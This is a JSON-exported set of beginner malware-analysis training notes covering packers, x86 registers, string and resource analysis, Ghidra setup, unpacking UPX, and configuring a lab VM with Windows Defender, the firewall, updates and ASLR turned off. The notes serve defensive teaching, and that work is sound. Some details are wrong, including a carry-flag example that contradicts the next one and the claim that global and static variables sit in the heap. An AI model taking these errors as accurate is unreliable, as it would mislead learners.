its sections using the PE-bear tool:\n\n In the image above, the malware file is opened with the PE-bear tool and its sections are displayed. Upon examining the section names, it is seen that there are section names specified for the “Aspack” packer in the table above. This indicates that the malware was indeed packed using the “Aspack” packer.\nNote: In this training module, section names have been utilized for manual packer detection. However, it is crucial to bear in mind that there are numerous other aspects within the malware that can be explored during manual packer detection. It is vital not to overlook the exploration of alternative areas if packer detection proves to be challenging or inconclusive.\nThis training section covers various aspects related to packing and unpacking, the benefits of packing, the operating logic of unpacking, different types of packers, and techniques for detecting packers manually and automatically. The subsequent part of the training delves into the topic of “Unpacking Packed Malware” which involves a practical application on malware."},"Malware-Analysis/Registers-1":{"slug":"Malware-Analysis/Registers-1","filePath":"Malware Analysis/Registers-1.md","title":"Registers-1","links":[],"tags":[],"content":"What is Register?\nRegisters are the variables in the assembly language. The size of each register in x86 architecture is 32 bits. Registers are located in the processor and each processor can have its own proprietary registers.\nGeneral Purpose Registers\nGeneral purpose registers can be divided into 3 subcategories:\n\n\nData Registers\n\n\nPointer Registers\n\n\nIndex Registers\n\n\n\nData Registers\nData registers are the ones that contain data.\nEAX (Accumulator Register)\nThe most basic register used in arithmetic operations is the “EAX” register. It stores the results of arithmetic operations and the return values of functions. For example, it is used for operations such as addition and multiplication.\nEBX (Base Register)\nIt is the register that holds the base address of the program.\nECX (Counter Register)\nThe “ECX” is the register that is used as counter. It is used in loop and string operations.\nEDX (Data Register)\nIt is a register that is generally used for holding data. It is also used in I/O (Input/Output) operations.\nPointer Registers\nPointer registers are the ones that hold memory addresses.\nEBP (Base Pointer)\nEBP is the one that holds the lowest address of the Stack and is used for local variables.\nESP (Stack Pointer)\nIt is the register that holds the top address of the stack. Displays the last element that entered the Stack.\nEIP (Instruction Pointer)\nThe EIP register may be the most important register as it holds the address of the next instruction to be executed in the program flow. In other words, if the value of this register is changed, the flow of the program can be interfered with.\nIndex Registers\nIndex registers are used for index information storage.\nESI (Source Index)\nIt is the register that holds the source index information for string operations. It holds the address of where the data will be read.\nEDI (Destination Index)\nIt is the register that holds the destination index information for string operations. It holds the address of where the data will be written."},"Malware-Analysis/Registers-2":{"slug":"Malware-Analysis/Registers-2","filePath":"Malware Analysis/Registers-2.md","title":"Registers-2","links":[],"tags":[],"content":"Segment Registers\nSegment registers are the registers used to hold addresses of specific segments in memory.\nStack Segment (SS)\nIt is the segment register that holds the base location address of the stack.\nCode Segment (CS)\nIt is the register which is known as “.text” and it holds the address of the code segment used for data access.\nData Segment (DS)\nIt is the register which is also known as “.data” and it holds the address of the data segment which is the default variable location for data access.\nExtra Segment (ES)\nIt is the register that holds the address of the extra segment used during string operations.\nEFLAGS Register - Status Flags\nThe EFLAGS register, unlike other registers, is a special register where each bit has a different meaning. The values of the bits of this register allow the CPU operations to be controlled and monitored.\nAdjust Flag (AF)\nIt is the flag that is set when there is a transfer from the 3rd bit to the 4th bit in arithmetic operations.\nCarry Flag (CF)\nIt is the flag that is set in arithmetic operations when the value of the register is more than the maximum value or if the value is less than the minimum value of the register. For example, the description over 4 bits is as follows:\nExample 1: \nInitially: “CF = 0”\n1111 + 0001 = 0000 (CF = 1)\n0000 - 0001 = 1111 (CF = 0)\nExample 2: \nInitially: “CF = 0”\n0000 - 0001 = 1111 (CF = 1)\nExample 3: \nInitially: “CF = 0”\n0111 + 0001 = 1000 (CF = 0)\n1000 - 0001 = 0111 (CF = 0)\nDirection Flag (DF)\nIt is the flag that determines the direction in the transport and comparison of string data. The string operation is performed from left to right in case of “DF = 0”, and from right to left in case of “DF = 1”.\nInterrupt Flag (IF)\nIt is the flag that determines whether external interruptions are taken into consideration and therefore it is the flag that determines whether the necessary operation is implemented. Keyboard entry would be a good example to the external interruption. Interruptions are ignored in case of “IF = 0” and considered disabled, and are applied to the process in case the “IF = 1” state.\nOverflow Flag (OF)\nThe overflow flag is set when a positive value for the signed integer is too large to be represented in the register, or when a negative value is too small.\nParity Flag (PF)\nIt is the flag that shows the total number of “1” bits in the results of arithmetic operations. If the total number of “1” bits is even, it becomes “PF = 1”. If the total number of “1” bits is odd, it becomes “PF = 0”.\nExample 1: \n10111100 + 00010001 = 11001101 (PF = 0)\nExample 2: \n10111100 + 00010000 = 11001100 (PF = 1)\nSign Flag (SF)\nIt is the flag that indicates whether the result of an arithmetic operation is negative or positive. If the result of the arithmetic operation takes a negative value, the sign flag is set as “SF = 1”. In case of a positive result, the sign flag will be in the state of “SF = 0”.\nTrap Flag (TF)\nIt is the flag that allows the processor to set the operating mode as single-step mode. The debugger program sets this flag to run each command one by one. In this way, each command executed by the processor at the assembly level can be executed step by step.\nZero Flag (ZF)\nIt is the flag set depending on whether the result of the arithmetic or the comparison operations is “0” (zero). If the result of the operation is “0”, then the  zero flag is set as “ZF = 1”. If the operation result is other than zero, then the zero flag is not set “ZF = 0”."},"Malware-Analysis/Resource-Analysis":{"slug":"Malware-Analysis/Resource-Analysis","filePath":"Malware Analysis/Resource Analysis.md","title":"Resource Analysis","links":[],"tags":[],"content":"What is Resource?\nResource refers to the assets that are contained within a Windows executable file and are used depending on the needs. For example, icons and images can be included as resources within a Windows executable.\nSignificance of Resource Analysis\nOne of the parts that can provide information about the behavior of a Windows malware is the section where resources are located. The malware may use another executable file as a resource. In this case, by learning the task performed by the executable file within the resources of the malware, insights about the malware’s behavior can be obtained.\nHow to Analyze Resources on Windows Executable\nThere are several tools available to view the resources within Windows executable files. One of these tools is “Resource Hacker.” Resource Hacker is a user-friendly tool with a graphical user interface (GUI). You can access the Resource Hacker tool at the following address:\nResource Hacker:  www.angusj.com/resourcehacker/ \nLet’s use this tool to view the resources of a file:\n\nWhen the Resource Hacker tool is first launched, it starts with a blank page as shown in the image above. With the “File → Open” option, the file whose resources are to be seen is imported into the program.\n\nAs seen in the image above, the resources belonging to the file are successfully listed.\nFollowing tools can also be used to see the resources:\n\nCFF Explorer: ntcore.com/ \nPE-Bear: github.com/hasherezade/pe-bear \nPE Studio: www.winitor.com/download\n"},"Malware-Analysis/Reverse-Engineering-Basics":{"slug":"Malware-Analysis/Reverse-Engineering-Basics","filePath":"Malware Analysis/Reverse Engineering Basics.md","title":"Reverse Engineering Basics","links":[],"tags":[],"content":"What is Reverse Engineering?\nReverse engineering is the analysis that helps determine what operations are the programs running when they started. This analysis is conducted while the executable files at the assembly code level (low level) are in operation or statically. Reverse engineering is mainly used for malware analysis within the cybersecurity industry.\n\nWhen Should the Reverse Engineering be Conducted and Why?\nMalware analysts must perform accurate analyses in order to use time efficiently as the reverse engineering is a time-consuming analysis process. For example, if mobile devices are not included in the assets within the organization, it would not be a coherent approach to perform mobile malware analysis. Instead, known malware types that may be a threat to existing assets within the organization should be analyzed. Alarms in the security products can be updated and additional measures can be taken according to the analysis reports. The important thing here is to reveal the attack methods of the current threats and take the necessary precautions, also to improve the monitoring and detection capability of the SOC team accordingly.\nThe Role of the Reverse Engineering in the Blue Team\nDifferent type of malware are the common ways to infect and seize the victim system nowadays and so reverse engineering is very important for the blue team as reverse engineering techniques are used to analyze the behavior of malwares. Since it is not usually possible to directly access the source code of the malware, we can only know or learn the behaviors and activities of the malware through reverse engineering techniques.\nCreating a Reverse Engineering Lab\nThe lab environment to be used for reverse engineering works and analyses are highly suggested to be virtual systems as we will examine malicious files mostly and would not want our systems to be infected with the malware that we are analyzing. The files to be analyzed in this training are files that are specifically created for this training class and do not have malicious elements. However, it is still recommended that the analysis environment be located on an isolated virtual operating system. It would be more appropriate to analyze the files in their own ecosystem in order for reverse engineering work to be carried out correctly and get the best results. For example, if a file with the extension “.exe” is to be analyzed, analysis should be performed with the Windows specific tools on a Windows operating system.\nTools to be Used in Reverse Engineering Lab\nFile Command\nThe file command is a basic command used to get information about files on Linux.\nObjdump\nObjdump is one of the tools that can be used for reverse engineering on the Linux command line.\nGCC\nGCC is a tool used to compile source codes of the C programming language on the Linux command line.\nGNU Debugger (GDB)\nGNU Debugger (GDB) is a tool on the Linux command line that allows to analyze files dynamically while they are running."},"Malware-Analysis/Reverse-Engineering":{"slug":"Malware-Analysis/Reverse-Engineering","filePath":"Malware Analysis/Reverse Engineering.md","title":"Reverse Engineering","links":["Malware-Analysis/Reverse-Engineering-Basics","Malware-Analysis/Basic-Concepts","Malware-Analysis/Memory-Layout","Malware-Analysis/Sample-C-Program","Malware-Analysis/C-Binary-Decompiling-with-Ghidra","Malware-Analysis/Registers-1","Malware-Analysis/Registers-2","Malware-Analysis/x86-Assembly","Malware-Analysis/CPU-Instructions","Malware-Analysis/GNU-Debugger-(GDB)","Malware-Analysis/Debugging-with-GDB"],"tags":[],"content":"Basics\n1. Reverse Engineering Basics\nWhat Reverse Engineering is, when and why reverse engineering techniques are used and its importance for blue team are explained.\n2. Basic Concepts\nThis topic covers the basic reverse engineering concepts that you will encounter while working on reverse engineering and practical examples about them.\n3. Memory Layout\nIt is important to have some foundational background information on how the basic computer hardware and software function in order to be able to work on reverse engineering. This topic covers the components of memory and their functioning.\n4. Sample C Program\nTo have a thorough understanding of C programming language is one of the most important steps to be able to start learning about reverse engineering because the C programming language is the system programming language that is closest to the assembly language, which is very similar to machine code, and it is the most appropriate and necessary programming language to be able to understand  the reverse engineering. This topic covers the C programming language as well as the Ghidra tool.\n5. C Binary Decompiling with Ghidra\nThis topic covers an example of decomplation in which a C Program is decompiled using Ghidra.\nIntermediates\n1. Registers-1\nThis topic covers some general purpose registers and their uses.\n2. Registers-2\nThis is continuation of earlier note and some special registers are discussed here.\n3. x86 Assembly\nThis topic discusses x86 assembly language syntax and addressing modes.\n4. CPU Instructions\nThis topic discusses various CPU instructions such as ADD, SUB, etc and Operation Codes.\n5. GNU Debugger (GDB)\nThis article contains info on how to install gdb  with a plugin on linux (debian systems) and basic usage of gdb.\n6. Debugging with GDB\nThis is an example showing GDB used in debugging a linux executable file."},"Malware-Analysis/Sample-C-Program":{"slug":"Malware-Analysis/Sample-C-Program","filePath":"Malware Analysis/Sample C Program.md","title":"Sample C Program","links":[],"tags":[],"content":"About the C Programming Language\nThe C programming language is one of the most popular programming languages that was created in the 1970s and has been widely used for many purposes since then. It is a programming language that is close to the operating system and to program it is relatively easier than the Assembly language. C is also one of programming languages that really helps understanding the reverse engineering. Therefore, the programs used for reverse engineering in this training were written in C programming language. It is necessary and would be helpful to have thorough knowledge of the programming language when conducting reverse engineering. For example, the functions are used as references during the analysis and being familiar to the function names of the programming language will definitely make a difference for us to be able to continue the analysis. The C programming language is very comprehensive and can even be the topic of its own training series. Basic knowledge of C programming language will be sufficient for this training.\nCompile Process\nA source code written in the C programming language goes through many intermediate stages while being compiled until it becomes an executable file. In this section, these steps are briefly mentioned. These stages are as follows:\n\n\nPre-processing\n\n\nCompilation\n\n\nAssembling\n\n\nLinking\n\n\n\nPre-processing\nA source code file with the extension “.c” is given to the pre-processing stage. At this stage, some preliminary preparations are applied on the source code to prepare for the compilation process. For example, deleting the comment lines in the source code is one of them. The file extension at this stage is “.i”.\nCompilation\nAt this stage, the code takes the form of assembly code. The file extension at this stage is “.s”.\nAssembling\nAt this stage, assembly code becomes machine code and is the last stage before it becomes an executable file. This state of the file is the “object” state. At this stage, the file extension is “.obj” or “.o”.\nLinking\nThe last stage before the executable file is created is the linking stage. This stage is very important in terms of its task because the linking of the libraries of the functions used in the program is performed at this stage. The object file created in the previous stage and the library files are combined to form the executable file. After this stage, the file extension becomes “.exe” for Windows systems. In Linux systems, it is in the form of “.out”, but since there is no file extension for executable files in Linux systems, output files can be created without the extension. At this file state, it is now ready to be run.\nCompiling C Source Code with GCC\nAfter briefly mentioning the compile process of the C programming language, let’s see how to compile the C source code with the “.c” extension using “GCC” in this section.\nFirst, type “Hello World!” on the command line. Let’s see the source code of the program that prints it:\n\nAs seen in the image above, a source code with a simple print operation was written in C programming language and saved as a “helloworld.c” file.\nNote: It usually comes pre-installed by default in “GCC” Linux distros, and it may need to be installed later in some Linux distros. For example, we will need to have it installed in the “Debian” used in this training as it is not installed in it. The following command can be used in Debian-based some Linux distros to install the GCC tool:\nInstall GCC: `sudo apt-get install gcc-multilib\nLet’s compile this source code with GCC:\n\nAs seen in the image above, GCC and C source code were successfully compiled and an executable file named “helloworld” was created. The meanings of the parameters in the command are as follows:\n-m32: This parameter allows compile to 32-bit systems. This parameter is required because 32-bit executable files are used in the training.\n-o: This is the parameter that gives the name of the file as output.\nCompile Command: `sudo gcc -m32 helloworld.c -o helloworld\nLet’s see the print operation by running the file:\n\nAs you can see in the image above, the file was successfully run.\nReviewing the C Source Code\nWe covered the stack and heap fields in the previous topics. We will exemplify the elements in the stack and heap area over the C code in this topic:\n\nAs can be seen in the image above, the status of the variables in the stack or heap can change depending on the fact that there are many different qualities in the C code. Variables named “a” and “y” defined as local variables are located in the stack area. Also, the variable named “x”, which is defined as the function parameter is another example for a variable in the stack area. On the other hand, “global_variable”, which is defined as a global variable is the example for the variables in the Heap field. In addition, the variable named “static_var”, which is defined as static, is also included in the heap area. Finally, another variable in the heap field is the variable named “z”, which is defined as an integer pointer. The reason why this variable is in the heap field is that the function named “malloc”, which is one of the dynamic allocation functions, is used. In addition to the malloc function, the C functions named calloc, free and realloc can be given as examples of functions used for dynamic memory allocation purposes.\nInstalling Ghidra Tool on Linux\nGhidra is an advanced reverse engineering tool that can be installed and used for free and available to everyone. Ghidra is a versatile tool where many reverse engineering operations can be conducted. One of its most important features is the decompile feature. Ghidra has a user friendly graphical user interface (GUI) and can run on both Windows and Linux.\nYou can access the Ghidra tool at the following link:\nGhidra: ghidra-sre.org/\nThe installation of the Ghidra tool is simply as follows:\n\nJDK 17 is required for the Ghidra tool to work, so JDK 17 must be downloaded and installed first:\nJDK 17 (64-Bit): adoptium.net/temurin/releases/ \n\nNote: Ghidra and JDK files are included in the Linux system, which is covered later in the training.\nAs seen in the image above, the 64-bit version of JDK 17 for Linux is downloaded. The downloaded compressed file with the extension “tar.gz” is extracted under any directory:\n\nAs you can see in the image above, the JDK file has been successfully extracted. After this process, “bin” directory that is in the JDK directory should be added to the path for ghidra to work. For this, a line must be added to the “.bashrc” file. For this, a line must be added to the “.bashrc” file.\nLet’s open this file under the home directory with the nano editor:\nCommand: `sudo nano ~/.bashrc\n\nThe red section in the image above shows the added line. The purple area in this section shows the bin directory location in the JDK.\nAdded Line: `export PATH=/home/letsdefend/reverse/jdk-17.0.5+8/bin:$PATH\nNote: The path part of the JDK file should be arranged in such a way that the full path should be the exact location of the JDK file.\nWe have installed the JDK successfully. The zip file of the Ghidra tool is downloaded and opened.\nCommand: `unzip ghidra_10.2.2_PUBLIC_20221115.zip\n\nAfter extracting the Ghidra zip file, the installation is completed. Running the underlined file in the image above will be enough to open the Ghidra tool."},"Malware-Analysis/Setting-up-Malware-Analysis-Lab":{"slug":"Malware-Analysis/Setting-up-Malware-Analysis-Lab","filePath":"Malware Analysis/Setting up Malware Analysis Lab.md","title":"Setting up Malware Analysis Lab","links":["Malware-Analysis/Malware-Analysis-Tools"],"tags":[],"content":"Creating a malware analysis lab\nInstalling Virtualization Software\nBefore installing a virtual operating system, we need to install one of the virtualization software that enables this.\nWhile there are some differences between them, any of the virtualization software will help us for our dynamic analysis. You can install one of the following virtualization software:\n\nVMware Workstation\nVMware Fusion (for macOS)\nOracle Virtualbox\n\nWe will use VMware Workstation virtualization software during the training and it is recommended for you to install it so that you can follow the training easily.\nYou can download and install VMware Workstation here.\nInstalling Operating System\nAfter installing the virtualization software on our system, let’s set up our operating system with the help of these virtualization software.\nIn order to install the operating system together with the virtualization software, we need to obtain the ISO files of the operating systems. You can use the application called MediaCreationTool published by Microsoft to create an ISO file for the Windows operating system.\nMalware may be programmed not to work or to behave differently depending on the operating system. For this reason, we strongly recommend that you have different operating systems at hand.\nWhen you run MediaCreationTool, you will be prompted with “Upgrade this PC now” and “Create installation media” options. Let’s continue by selecting the “Create installation media” option.\n\nThen we are asked to choose Language, operating system version information and operating system architecture. From here you can choose the Windows 10 64bit option. We recommend you to choose the operating system with 64bit architecture first. You can run both 32-bit applications and 64-bit applications on operating systems with 64-bit architecture, but you can only run 32-bit applications on operating systems with 32-bit architecture.\n\nAfter choosing the operating system version information and architecture, we are asked whether we want to write to the USB drive or create an ISO file. Since we need the ISO file, we choose the ISO option here.\n\nThen we are asked in which directory we want the ISO file to be saved. You may choose an appropriate directory for you.\nWhen you complete these steps, the ISO file will be saved in the directory you specified. (This step may take a long time.)\nNow that we have the ISO file, we can proceed to the installation of the operating system. Since VMware Workstation will be used in this training series, the lecture will be through this software. However, If you wish to use another virtualization software you should be able to adapt the lecture for other virtualization software easily since all these software are very similar.\nSince we are going to install a new operating system, we must first click on the “Create a New Virtual Machine” button. Alternatively, you can select “File” from the top menu and then “New Virtual Machine”.\n\nThen, we are asked to choose what kind of installation we want to proceed with. We continue our installation by choosing “Typical (recommended)”.\n\nWe select the ISO file that we have downloaded by selecting the “Installer disc image file (iso)” option.\n\nNext, we are asked to name the Virtual Machine and specify the directory that we want the files of the VM to be kept. You can use “Windows10 Dynamic Analysis” as the name and “the default directory” as the directory. We recommend giving it a descriptive name to your VM so that you won’t confuse your VMs if you have multiple. If you wish you can change this name you have given to the VM later.\n\nAfter choosing the name and the directory where the VM’s files will be kept, we are asked to determine the disk size of our operating system. Since we will install various software and applications in it, we recommend that you allocate a minimum of 60-70 GB.\n\nFinally, we are presented with some hardware settings that the operating system uses. At this stage, we go to the customization step by clicking the “Customize Hardware” button.\n\nSince we are using an operating system with a 64-bit architecture, I recommend reserving a minimum of 4 GB of RAM. If you assign lower settings you may end up with performance and operating system errors. However, if you are installing an operating system with a 32-bit architecture, then you may allocate less RAM.\n\nAfter we pass this stage, a Virtual Machine with the settings we specified is being created.\n\nAfter the VM is created, you can install the operating system normally by running the created VM.\nInstalling Tools and Software\nAt this point, our operating system is now ready for use. Next is the installation of tools and software that we will use during dynamic analysis.\nYou should install the tools we mentioned in our Malware Analysis Tools article on your virtual operating system now.\nTweaking Virtual Machine\nWe need to make some configuration changes on our Virtual Machine to be able to use it for malware analysis.\n1. Turn off anti-malware solutions\nSince we will analyze malware on our VM, we do not want antivirus software to delete the malware we have installed for analysis. We should turn off Windows Defender which comes active by default in Windows operating systems.\nYou should go to Windows Defender settings and disable all active settings. The feature that instantly scans and deletes the malware you have installed to analyze is “Real-time protection”. Make sure you turn this feature off.\n\nDisable Windows Defender Using Group Policy\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through “Search&gt;Run” function on Windows.\nTo disable Windows Defender using the Local Group Policy Editor application, you must access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Microsoft Defender Antivirus”\nHere, you should double-click the “Turn off Microsoft Defender Antivirus” policy and set it to “Enabled”.\n\nYou should also disable the “Monitor file and program activity on your computer” policy under “Real-time Protection”.\n\n2. Rename your virtual operating system\nSome malicious software makes various checks in order not to work in analysis environments. One of these checks is to check the hostname. Since most sandboxes have hostnames such as “Sandbox”, “Malware”, “Cuckoo” …, malware is programmed not to run on systems with these hostnames.\nYou should make your VM look like a normal user’s system as much as possible so that you can avoid anti-analysis techniques. Specifying a random name as the hostname will allow you to help avoid such checks.\nTo change the device name, you must select “Settings → System → About” and then click the “Rename this PC” button.\n\nDon’t forget to change your username too!\n3. Turn off auto updates\nThe malware we are going to analyze may be taking advantage of vulnerabilities in the operating system. In order for the malware to run as normally as possible, we need to turn off the automatic updates of our virtual operating system.\nYou can turn off automatic updates through the group policy settings.\nYou can open the Local Group Policy Editor application by searching for “edit group policy” in the start menu. Alternatively, you can access the Local Group Policy Editor application by searching for “gpedit.msc” or by running it through the “Search&gt;Run” function on Windows.\nYou should then access the policy below.\n“Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Update”\nAfter accessing the relevant policy, you should set the policy named “Configure Automatic Updates” to “Disabled”.\n\n4. Disable Hidden Extensions\nYou may have seen the attackers try to trick their victims by changing the file extensions. How could they do this?\nWindows operating systems are set to hide known file extensions by default. In other words, a file named “Chrome.exe” will appear as “Chrome” by default. Attackers name their malicious software as “Photo.jpg.exe”, causing the user to see the file as “Photo.jpg”. When the user thinks that this file is an image file and opens it, the malware will start to run.\nIn order not to get confused with this during our analysis, we need to fix it so that the extensions that are hidden by default are always shown.\nFor this, we need to open the application named “File Explorer” and access the settings menu by clicking the “File” and then “Change folder and search options” buttons from the top menu.\n\nThen you should save the settings by unchecking “Hide extensions for known file types” from the “View” tab.\n\n5. Show Hidden Files and Folders\nMalware aims to prevent the user from detecting their files by hiding them. By default, showing hidden files and directories will enable us to perform a more comfortable analysis.\nLet’s open the application called File Explorer and open the settings menu with the help of “File” from the top menu, then click “Change folder and search options”.\n\nThen, let’s check the “Show hidden files, folders, and drives” from the “View” tab and save the setting.\n\n6. Disable ASLR\nNew versions of Windows have an anti-exploit security mechanism called ASLR (Address Space Layout Randomization). We won’t get into ASLR too much in this training, but you may want to disable this feature at this stage as it will come up in the future.\nYou can disable this setting with the help of Registry. Access the following registry by opening the Registry Editor application.\n`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\n\nThen create a REG_DWORD type key named MoveImages.\nThese settings will eventually disable the ASLR feature.\n7. Disable Windows Firewall\nAs we implemented in the previous steps, we should disable the Windows Firewall to prevent the security mechanisms from interfering with the malicious software we analyze.\nAccess Windows Defender Firewall settings via the control panel. You can access these settings using the search bar in the top menu of File Explorer. If you copy and search the following path in this search bar, it will take you to the Windows Defender Firewall settings.\n“Control Panel\\System and Security\\Windows Defender Firewall\\Customize Settings”\n\nAfter accessing the Defender Firewall settings, select “Turn off Windows Defender Firewall” and save it. This will disable the Firewall.\n\n8. Mimic an End-User System\nYou should make your VM look like a normal end-user operating system as much as possible so that the malware you are analyzing is not caught by anti-analysis techniques.\nSince there are no precise instructions or settings for this, it’s totally up to you to make your analysis VM look like a normal end-user’s computer. We can recommend the following tips to implement on your VM to establish this similarity:\n\nInstalling browsers frequently preferred by end-users such as Chrome and Firefox,\nLeaving files in different directories that will be of interest to the attacker,\nChanging the desktop background,\nTo ensure that some files are found in the Downloads directory by downloading small applications through the browser\n\n9. Change Network Settings\nWe need to prevent our malware from spreading to different devices via network connection. Thanks to the private networks provided by virtualization software, we can prevent malware from infecting different devices.\nFor this, you must click on the “VM” menu in the top menu of VMware Workstation and select “Settings”.\nYou should select the “Custom” setting by selecting “Network Adapter” from the left menu in the window that opens.\n\nTake a Snapshot\nYour operating system may be affected functionally or become unusable after you analyze malware or ransomware on your system. When you want to analyze a new malware after running and analyzing another malware, you do not want your operating system to get affected by the changes that was made by the old malware you analyzed.\nIn such cases, you can take advantage of the Snapshot feature of virtualization software.\nSnapshot is a feature that allows you to take a snapshot of your Virtual Machine and return to this backup later.\nOur VM has been configured for malware analysis and the applications that we will be using in the analysis have been installed into it. At this stage, you can take a Snapshot and then switch to the same analysis environment with your clean VM.\nTo take snapshots, you can access the screen where you manage Snapshots by clicking the “VM” menu in the top menu of the VMware Workstation application and clicking “Snapshot” → “Snapshot Manager”.\nThen you can take a snapshot of your VM by clicking the “Take Snapshot” button. That’s how easy it is to take snapshots.\n\nEntering detailed information on the description will allow you to easily find the Snapshot you need. For this reason, we recommend that you enter as descriptive comments as possible."},"Malware-Analysis/Static-Malware-Analysis":{"slug":"Malware-Analysis/Static-Malware-Analysis","filePath":"Malware Analysis/Static Malware Analysis.md","title":"Static Malware Analysis","links":["Malware-Analysis/Unpacking-Malware","Malware-Analysis/Packers--and--Unpackers","Malware-Analysis/File-format-analysis","Malware-Analysis/Malware-Hash","Malware-Analysis/String-Analysis","Malware-Analysis/Analyzing-Imports--and--Exports","Malware-Analysis/Digital-Signature-Analysis","Malware-Analysis/Resource-Analysis"],"tags":[],"content":"Static analysis is the first step of malware analysis. Static analysis can reveal lots of details about malware and can be used as preliminary step before Dynamic Analysis.\nDifferent Analytics\n\nThe first step of static analysis is Unpacking Malware. For this one needs to understand what Packers &amp; Unpackers are.\nThe second analysis is File format analysis.\nWe can now calculate the Malware Hash. This will give us a  unique signature of malware which we can use to find reports in signature databases.\nWe can do String Analysis to gather info such as C2, file addresses, etc.\nThe next analytical method is Analyzing Imports &amp; Exports which can reveal further info about the malware.\nA simple Digital Signature Analysis can also reveal if the application is legit or not.\nResource Analysis can reveal assets utilized by the malware aiding in analysis.\n"},"Malware-Analysis/String-Analysis":{"slug":"Malware-Analysis/String-Analysis","filePath":"Malware Analysis/String Analysis.md","title":"String Analysis","links":[],"tags":[],"content":"What is a String?\nA string is a type of variable that is included in the source code of the software. This variable type consists of strings of characters which are usually made of meaningful words or groups of words. For example, the following C# source code contains variables of type string:\n\nSignificance of Strings Analysis\nExamining strings is of great importance in static malware analysis as valuable information about malware can be extracted from the strings. Here are some examples of the information that can be derived from:\n\n\nFile Names\n\n\nFile Paths\n\n\nIP Addresses\n\n\nDomain Names\n\n\nURL Addresses\n\n\nSecurity Product Names\n\n\nCrypto References\n\n\nWindows API Info\n\n\nBase64 Encoded Data\n\n\nFile Names\nStrings may contain the names of files targeted or used in the operating system. Knowing which file(s) on the system are targeted and used may provide important information about the behavior of the malware.\nFile Paths\nStrings within the malware code may include path information regarding the files utilized by the malware. Knowing the directory in which the malware operates can streamline the analysis process and reduce the time required. Furthermore, file paths play a crucial role in identifying the specific files that the malware interacts with for read/write operations.\nIP Addresses\nStrings may contain the IP address(es) in a readable format. These IP addresses may correspond to the Command &amp; Control (C2) server that the malware communicates with to receive commands.  Therefore it is essential to check whether any IP address information is present in the strings to identify and monitor the network activities associated with the malware.\nDomain Names\nStrings may contain domain names. Examining these domain names is necessary to understand the behavior of the malware. Malware may attempt to exfiltrate data from the network using the DNS protocol. In this sense, it is crucial to scrutinize network communications involving suspicious domain addresses.\nURL Addresses\nStrings can contain URL addresses. Malware can use URL addresses for various purposes. For example, it can download files or retrieve the information it needs from the internet, or similarly, it can use a URL address to exfiltrate data from the network.\nSecurity Products\nStrings may contain the names of security solutions, namely; IDS, antivirus, and EDR. In order to hide its behavior on the compromised system, the malware may check whether there is a security solution on the operating system. It may or may not perform its operations accordingly. If a security solution circumvention method is available, it may apply and continue its operations on the system.\nCrypto References\nStrings may include the names of cryptology libraries. The presence of such library names in strings suggests that the malware can perform encryption operations. For example, ransomware-type malware can encrypt files. When cryptographic libraries are identified within the strings, it is crucial to consider the possibility that the malware may be ransomware or involved in encryption operations.\nWindows API Info\nStrings may contain the names of library files belonging to Windows. Malware can use libraries of Windows to perform operations on the system. For example, the attacker may attempt to remotely connect to the system through the session initiated by the malware and manage the system from the graphical interface. Windows libraries may be employed to determine the presence or absence of user activity on the screen or to monitor similar system activities.\nBase64 Encoded Data\nStrings may contain base64 encoded data within them. Malware may contain encoded data to hide some information between strings or to avoid detection by automated static analysis tools. Therefore, encoded data must be detected and decoded when analyzing malware strings.\nAnalyzing Embedded Strings\nAnalyzing the strings of malware is generally a straightforward process. However, identifying the specific values within the strings that provide crucial information about the malware can be challenging. The string output can be lengthy, making it easy to overlook important strings. It is recommended to perform a target-oriented analysis by applying certain search methods. Command line tools or tools with graphical user interface (GUI) can be used when analyzing strings.\nAnalyzing Embedded Strings with Command Line\nIn the Windows operating system, the “strings” tool among the Sysinternals tools can be used to examine the strings of malware via the command line. You can access the strings tool from the address below:\nStrings: learn.microsoft.com/en-us/sysinternals/downloads/strings \nLet’s examine the strings of a malware from the command line:\nCommand: strings64.exe -accepteula malwr3.exe | more\n\nAs seen in the image above, the command line is opened in the directory where the strings tool is located and the strings of the malware named “malwr3.exe” is successfully displayed.\nNote: When using the strings tool for the first time, the user agreement must be confirmed with the “-accepteula” parameter, otherwise the tool will not work.\nLet’s move on to analyzing the strings:\n\nAs seen in the image above, an IP address is identified in the strings output. This IP address could be the Command &amp; Control (C2) server IP address from which the malware receives commands or an IP address to which it establishes connections. \nAnalyzing Embedded Strings with GUI\nExamining strings can be achieved with the “Bintext” tool, which has a graphical user interface (GUI) instead of the command line. You can access the Bintext tool at the following address:\nBintext: www.portablefreeware.com/index.php#:~:text=BinText%20is%20a%20file%20text,as%20well%20as%20Resource%20strings. \nLet’s see the strings of the malware in the previous example with bintext as an instance:\n\nUpon launching the Bintext tool, the interface displayed is similar to the image above. We can proceed by providing the malware to the Bintext tool and examine its strings. \n\nAs in the image above, first, the malware is loaded into the program using the “Browse” button and then the strings are displayed with the “Go” button.  Let’s proceed with further examination of the string:\n\nAs seen in the image above, the IP address information has been successfully displayed with the bintext tool. As seen in the image above, the IP address information has been successfully displayed with the bintext tool. Additionally, the Bintext tool offers a search feature. The desired value can be searched from the section at the bottom right of the window."},"Malware-Analysis/Unpacking-Malware":{"slug":"Malware-Analysis/Unpacking-Malware","filePath":"Malware Analysis/Unpacking Malware.md","title":"Unpacking Malware","links":[],"tags":[],"content":"First, we will find out the packer information with the “CFF Explorer” tool:\n\nAs can be seen in the image above, “UPX” packer name is written in the “File Info” section. The sections of the executable file are also as follows:\n\nThe image above displays the section names of the UPX packer. Through analysis of the “File Info” and “Section” sections, it has been concluded that the malware in question was packed with the UPX packer.\nOnce the packer used has been identified, the next step is to unpack the executable file using the appropriate tool. In the case of UPX packer, since it is an open-source packer, the required tool for unpacking is readily available on the internet. You can access the tool at the following address:\nUPX: upx.github.io/ \nNote: If a different packer was used and no readily available unpacking tool existed, the unpacking process would involve writing custom unpacking code or utilizing dynamic reverse engineering tools to analyze the executable file and extract the unpacked version.\nThe “CFF Explorer” tool includes a UPX unpacker itself, which allows for quick and efficient unpacking directly from the “UPX Utility” section.\n\nAfter the executable file has been unpacked using the “Unpack” button seen in the image above, the “File Info” field in the “File” menu on the left is checked.\n\nAs depicted in the image, the field that previously displayed “UPX” no longer indicates the presence of UPX after the unpacking process. This change signifies that the executable file 